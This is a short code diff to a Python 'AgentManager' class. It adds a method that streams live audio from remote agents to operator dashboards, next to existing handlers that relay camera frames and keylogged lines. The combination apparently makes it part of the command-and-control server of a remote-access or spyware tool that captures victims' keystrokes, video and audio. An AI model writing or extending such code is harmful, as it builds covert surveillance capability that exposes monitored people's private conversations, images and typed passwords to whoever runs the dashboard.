@@ -252,6 +252,14 @@ class AgentManager:
         payload = {"type": "camera_frame", "agent_id": str(agent_id), **frame}
         await self._broadcast_to_dashboards(payload)
 
+    async def relay_audio_live_to_dashboards(self, agent_id: str, payload: Dict[str, Any]) -> None:
+        data = {"type": "audio_live", "agent_id": str(agent_id)}
+        try:
+            data.update(payload or {})
+        except Exception:
+            pass
+        await self._broadcast_to_dashboards(data)
+
     async def relay_keylog_to_dashboards(self, agent_id: str, line: str) -> None:
         payload = {"type": "keylog_line", "agent_id": str(agent_id), "line": line}
         await self._broadcast_to_dashboards(payload)
